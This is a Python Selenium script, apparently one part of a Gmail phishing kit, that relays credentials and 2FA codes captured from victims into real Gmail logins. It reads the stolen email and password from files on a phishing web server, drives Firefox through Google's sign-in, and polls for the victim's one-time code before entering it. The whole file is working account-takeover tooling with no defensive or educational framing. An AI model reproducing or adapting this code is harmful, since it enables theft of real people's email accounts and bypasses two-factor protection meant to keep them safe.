# 1. Import required modules
import time, os
from selenium import webdriver

# 2. Define file paths (where stolen data is stored)
emailPath = "/var/www/html/gmailPhising/email.txt"
passwordPath = "/var/www/html/gmailPhising/pass.txt"
codePath = "/var/www/html/gmailPhising/code.txt"

# 3. Read the stolen credentials
femail = open(emailPath, "r")
email = femail.readline()  # Reads email from file

fpass = open(passwordPath, "r")
password = fpass.readline()  # Reads password from file

# 4. Initialize Firefox browser with geckodriver
driver = webdriver.Firefox(executable_path='/root/2FAGmailPhising/geckodriver')

# 5. Go to Gmail login page
driver.get("https://www.gmail.com")

# 6. Enter email and click Next
driver.find_element_by_name("identifier").send_keys(email.split("\n")[0])
driver.find_element_by_id("identifierNext").click()

# 7. Wait 1 second, then enter password
time.sleep(1)
driver.find_element_by_name("password").send_keys(password.split("\n")[0])
driver.find_element_by_id("passwordNext").click()

# 8. Wait for the 2FA code file to appear (from victim)
while not os.path.exists(codePath):
    time.sleep(1)  # Keep checking every second

# 9. Read the 2FA code from file
fcode = open(codePath, "r")
code = fcode.readline()

# 10. Enter the 2FA code and click Next
driver.find_element_by_name("idvPin").send_keys(code.split("\n")[0])
driver.find_element_by_id("idvPreregisteredPhoneNext").click()
